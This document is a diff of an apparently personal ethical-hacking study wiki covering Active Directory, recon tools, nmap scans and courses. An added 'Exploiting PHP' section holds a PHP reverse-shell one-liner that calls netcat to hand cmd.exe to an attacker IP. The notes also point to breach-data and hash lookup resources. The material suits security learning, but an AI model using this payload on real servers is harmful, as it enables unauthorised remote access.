@@ -5,9 +5,9 @@
 ---
 # Wiki Home
 > [!NOTE]
-> Wiki's will be listed under this section
+> Moving to gitbook: https://app.gitbook.com/o/RMK0BSt8mZaPuqrzEaVb/s/Aj6dDw45fJsrd0Z4qjXe/wiki/wiki-help#wiki-home
 
-## Windows Active Directory Overview
+## Windows Active Directory Wiki
 
 Key concepts and architecture of Active Directory.
 
@@ -272,7 +272,7 @@ netsh firewall show config
 - [ ] Chatterbox
 - [ ] SecNotes
 
-## **Tools Cheat Sheet**
+## **Tools Cheat Sheet #cheatsheet**
 - Reconnaissance Tools
   - theHarvester, Shodan, SpiderFoot
 - Scanning Tools
@@ -283,10 +283,60 @@ netsh firewall show config
   - Mimikatz, LinPEAS, BloodHound
 - Reporting Tools
   - Dradis Framework
+### netcat and nmap
+[Kioptrix Download](https://tcm-sec.com/kioptrix)
+
+Nmap
+```
+arp-scan
+```
+SYN SYNACK ACK nmap
+Stealth scanning
+SYN SYNACK ACK nmap -sS
+SYN SYNACK RST nmap -sS
+
+```
+nmap -T4 -P- -A
+```
+### Exploiting PHP
+This is a basic reverse shell written in php 
+```
+<?php
+system('nc.exe -e cmd.exe $yourip 4444')
+?>
+```
+### Recon Resources | Google Fu
+* Google, lmgtfy,
+* site:<domain>
+* site:tesla.com -www
+* filetype:csv
+
+### Recon Resources | email addresses
+* hunter.io
+* Phonebook.cz
+* Clearbit
+* email-checker.net
+* emailhippo.com
+
+### Recon Resources | hashes
+* hashes.org
+
+### Recon Resources | hunting subdomains and website technologies
+* sublist3r
+* owasp amass
+  
+* wappalyzer (Firefox)
+* burpsuite [https://burp](https://burp) - Kali
+* 
+
+### github
+[hmaverickadams | breach-parse | github.com](https://github.com/hmaverickadams/breach-parse)
+
+
 
 ---
 
-## **Learning Resources**
+## **Resources #resources**
 - Recommended Courses
   - TCM Academy (PNPT, OSINT, Practical Ethical Hacking)
 - Practice Labs
@@ -297,7 +347,13 @@ netsh firewall show config
   - "The Hacker Playbook"
   - "Red Team Field Manual"
   - "Metasploit: The Penetration Tester’s Guide"
+- https://github.com/swisskyrepo/PayloadsAllTheThings
 
+**Links to further reading and tools.**
+
+- [Microsoft Documentation](resources#microsoft-documentation)
+- [PowerShell Modules](resources#powershell-modules)
+- [Useful Tools for IT Admins](resources#useful-tools)
 ---
 
 # FAQ
@@ -309,13 +365,7 @@ Answers to commonly asked questions.
 
 ---
 
-# Additional Resources
 
-Links to further reading and tools.
-
-- [Microsoft Documentation](resources#microsoft-documentation)
-- [PowerShell Modules](resources#powershell-modules)
-- [Useful Tools for IT Admins](resources#useful-tools)
 
 ---
 # Dictionary Home
@@ -379,48 +429,6 @@ Verification by CA Server: The Enterprise CA server verifies the client’s perm
 [Build a lab in Azure](https://kamran-bilgrami.medium.com/ethical-hacking-lessons-building-free-active-directory-lab-in-azure-6c67a7eddd7f)
 
 
-### Recon Resources | Google Fu
-* Google, lmgtfy,
-* site:<domain>
-* site:tesla.com -www
-* filetype:csv
-
-### Recon Resources | email addresses
-* hunter.io
-* Phonebook.cz
-* Clearbit
-* email-checker.net
-* emailhippo.com
-
-### Recon Resources | hashes
-* hashes.org
-
-### Recon Resources | hunting subdomains and website technologies
-* sublist3r
-* owasp amass
-  
-* wappalyzer (Firefox)
-* burpsuite [https://burp](https://burp) - Kali
-* 
-
-### github
-[hmaverickadams | breach-parse | github.com](https://github.com/hmaverickadams/breach-parse)
-
-## Nmap
-[Kioptrix Download](https://tcm-sec.com/kioptrix)
-
-Nmap
-```
-arp-scan
-```
-SYN SYNACK ACK nmap
-Stealth scanning
-SYN SYNACK ACK nmap -sS
-SYN SYNACK RST nmap -sS
-
-```
-nmap -T4 -P- -A
-```
 
 ## other courses
 * OSINT Fundamentals
